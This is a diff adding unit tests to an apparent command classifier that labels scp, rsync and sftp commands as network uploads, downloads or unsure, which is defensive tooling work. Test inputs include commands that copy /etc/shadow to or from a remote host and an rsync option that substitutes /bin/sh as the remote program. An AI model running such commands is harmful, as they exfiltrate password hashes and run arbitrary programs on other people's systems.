@@ -466,3 +466,40 @@ def test_internal_error_is_unknown(monkeypatch: pytest.MonkeyPatch) -> None:
     assert props.parse_confident is False
     assert props.reason == "internal_error"
     assert False not in props.values.values()
+
+# ---------------------------------------------------------------- host-copy tools
+def test_scp_push_confident_direction_upload() -> None:
+    props = extract_command_properties("scp /etc/shadow admin@example.com:/tmp/")
+    assert props.parse_confident is True
+    assert props.values["network_upload"] is True
+    assert props.values["network_download"] is False
+
+
+def test_scp_pull_confident_direction_download() -> None:
+    props = extract_command_properties("scp admin@example.com:/etc/shadow ./stolen")
+    assert props.parse_confident is True
+    assert props.values["network_download"] is True
+    assert props.values["network_upload"] is False
+
+
+def test_rsync_push_confident() -> None:
+    props = extract_command_properties("rsync -a ./local user@host:/remote")
+    assert props.parse_confident is True
+    assert props.values["network_upload"] is True
+
+
+def test_scp_remote_spec_does_not_fire_local_path_facts() -> None:
+    # The remote side of the spec is not a path on this machine.
+    props = extract_command_properties("scp ./x admin@example.com:/etc/")
+    assert props.values["targets_root_or_system_path"] is False
+    assert props.values["targets_absolute_path"] is False
+
+
+def test_copy_tool_runs_program_stays_unsure() -> None:
+    for command in ("rsync -e ssh -p 2222 ./x host:/y",
+                    "sftp -b batch.txt admin@example.com",
+                    "scp -S /usr/bin/alt-ssh ./x host:/y",
+                    "rsync --rsync-path=/bin/sh ./x host:/y"):
+        props = extract_command_properties(command)
+        assert props.parse_confident is False, command
+        assert props.reason == "copy_tool_runs_program", command
